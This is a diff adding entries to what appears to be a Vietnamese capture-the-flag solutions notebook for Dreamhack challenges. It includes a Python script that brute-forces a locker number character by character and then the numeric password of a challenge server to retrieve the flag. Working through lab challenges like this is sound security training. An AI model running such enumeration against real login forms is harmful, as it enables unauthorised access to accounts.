@@ -146,3 +146,29 @@ leg=FlAG
 - Nếu m đọc tới đây, thì t biết là m đã bất lực.
 - Tin t đi không làm ra đâu.
   ```input1=0000000000&input2=356abcde```
+### Broken Buffalo Wings
+```/flag.txt = win ???????????``` 
+### random-test
+```py
+
+from string import ascii_lowercase, digits
+import requests
+
+url = "http://host3.dreamhack.games:24531/"
+alphabet = ascii_lowercase + digits
+pw = ''
+
+for y in range(4):
+    for x in alphabet:
+        res = requests.post(
+            url, data={'locker_num': pw+str(x), 'password': 100})
+        if "Good" in res.text:
+            pw += str(x)
+            print(f" {y} pw: {pw}")
+            break
+for x in range(100, 201):
+    res = requests.post(url, data={'locker_num': pw, 'password': x})
+    if "FLAG" in res.text:
+        print(res.text)
+        break
+```
